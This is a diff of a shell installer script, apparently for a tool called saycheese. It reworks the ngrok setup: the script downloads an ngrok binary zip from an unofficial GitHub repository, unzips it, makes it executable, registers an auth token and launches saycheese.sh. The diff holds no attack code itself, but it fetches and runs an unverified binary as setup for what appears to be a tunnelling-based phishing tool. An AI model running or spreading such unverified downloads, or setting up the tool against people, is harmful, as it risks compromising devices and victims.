@@ -33,11 +33,25 @@ cd
 rm -rf cloudflare-ui
 cd saycheese
 
-pkg install wget -y 
+if [[ -e ngrok ]]; then
+clear
+printf "\n\nConfiguration Now add you ngrok auth token then start the tool \n\n"
+
+echo -e '\e[96m   EXAMPLE AUTH CODE - ./ngrok authtoken KavOb3e638hhs9 '
+echo -e '\e[96m                           |'
+echo -e '\e[96m                   JUST PASTE THIS PART'
+echo -e '\e[96m  (dont copy paste this dummy one)- KavOb3e638hhs973ijsiwu'
+read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
+./ngrok config add-authtoken $name
+sleep 2
 clear
 
-wget https://github.com/uplodind/ngrok/raw/main/ngrok-stable-linux-arm.zip
+./saycheese.sh
 
+else
+pkg install wget -y 
+clear
+wget https://github.com/uplodind/ngrok/raw/main/ngrok-stable-linux-arm.zip
 unzip ngrok-stable-linux-arm.zip
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
@@ -48,13 +62,17 @@ echo -e '\e[96m   EXAMPLE AUTH CODE - ./ngrok authtoken KavOb3e638hhs9 '
 echo -e '\e[96m                           |'
 echo -e '\e[96m                   JUST PASTE THIS PART'
 echo -e '\e[96m  (dont copy paste this dummy one)- KavOb3e638hhs973ijsiwu'
-echo -e '\e[96m                           |'
-echo -e '\e[96m                           |'
-sleep 8.0
-clear
 read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
 ./ngrok config add-authtoken $name
-
+sleep 2
 clear
 
 ./saycheese.sh
+
+
+
+fi
+
+
+
+
